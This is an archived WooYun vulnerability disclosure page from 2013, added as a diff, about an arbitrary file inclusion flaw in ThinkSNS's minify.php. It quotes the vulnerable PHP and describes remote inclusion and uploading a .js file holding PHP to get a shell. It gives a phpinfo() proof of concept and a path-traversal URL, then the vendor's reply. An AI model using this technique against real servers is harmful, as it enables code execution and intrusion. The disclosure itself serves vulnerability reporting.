@@ -1,0 +1,228 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		ThinkSNS一处任意文件包含  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		ThinkSNS一处任意文件包含  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/齐迹">齐迹</a> 
+</li><li>提交时间：		2013-12-06 15:39</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-12-06：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-12-06：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-12-09：	细节向第三方安全合作伙伴开放<br/>
+									2013-12-16：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-12-26：	细节向普通白帽子公开<br/>
+									2014-01-15：	细节向实习白帽子公开<br/>
+									2014-03-06：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">ThinkSNS一处任意文件包含。一定条件下可以getshell</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">问题发生在<br />
+<br />
+public/minify.php<br />
+<br />
+</p><pre><code>allowed_content_types	=	array(&#039;js&#039;,&#039;css&#039;);<br />
+<br />
+$getfiles	= explode(&#039;,&#039;, strip_tags($_GET[&#039;f&#039;]));<br />
+<br />
+//解析参数<br />
+$gettype	= (isset($_GET[&#039;t&#039;]) &amp;&amp; $_GET[&#039;t&#039;]==&#039;css&#039;)?&#039;css&#039;:&#039;js&#039;;<br />
+<br />
+if($gettype==&#039;css&#039;){<br />
+	$content_type	=	&#039;text/css&#039;;<br />
+}elseif($gettype==&#039;js&#039;){<br />
+	$content_type	=	&#039;application/x-javascript&#039;;<br />
+}else{<br />
+	die(&#039;not allowed content type&#039;);<br />
+}<br />
+<br />
+header (&quot;content-type: &quot;.$content_type.&quot;; charset: utf-8&quot;);		//注意修改到你的编码<br />
+header (&quot;cache-control: must-revalidate&quot;);				//<br />
+header (&quot;expires: &quot; . gmdate (&quot;D, d M Y H:i:s&quot;, time() + 60 * 60 * 24 * 7 ) . &quot; GMT&quot;);	//过期时间<br />
+<br />
+ob_start(&quot;compress&quot;);<br />
+<br />
+function compress($buffer) {//去除文件中的注释<br />
+	$buffer = preg_replace(&#039;!/\*[^*]*\*+([^/][^*]*\*+)*/!&#039;, &#039;&#039;, $buffer);<br />
+	return $buffer;<br />
+}<br />
+<br />
+foreach($getfiles as $file){<br />
+	$fileType = strtolower( substr($file, strrpos($file, &#039;.&#039;) + 1 ) );<br />
+	if(in_array($fileType, $allowed_content_types)){<br />
+		//包含你的全部css文档<br />
+		include($file);<br />
+	}else{<br />
+		echo &#039;not allowed file type:&#039;.$file;<br />
+	}<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+通过$_GET[&#039;f&#039;] 可以传递一个js或者css后缀的文件，内容为php脚本即可被包含并执行。<br />
+<br />
+<br />
+<br />
+当allow_url_fopen=On 的情况下 利用就非常简单<br />
+<br />
+直接远程文件。<br />
+<br />
+当为Off的时候 就想办法上传一个js或者css文件到服务器 然后包含即可被执行！ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">写一个1.js在网站根目录<br />
+<br />
+</p><pre><code>&lt;?php<br />
+phpinfo();</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+访问<br />
+<br />
+http://xxxxxx/public/minify.php?f=../1.js<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/06152043ba5a504db0b96833dc1829cba00d0c03.jpg" target="_blank"><img src="../images/06152043ba5a504db0b96833dc1829cba00d0c03.jpg" alt="thinksns_include.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">对参数进行严格过滤 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/齐迹" title="齐迹">齐迹</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-045130" title="ThinkSNS一处任意文件包含">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：低</p>
+						<p class="detail">漏洞Rank：1 </p>
+													<p class="detail">确认时间：2013-12-06 15:57</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢！但是我们测试后无法直接包含远程文件。服务器上也不允许上传js、css文件，那么包含本地js/css文件有什么方法能造成比较大的危害呢？如果有，请再提交一个漏洞，给你高分，谢谢！</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="45130";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
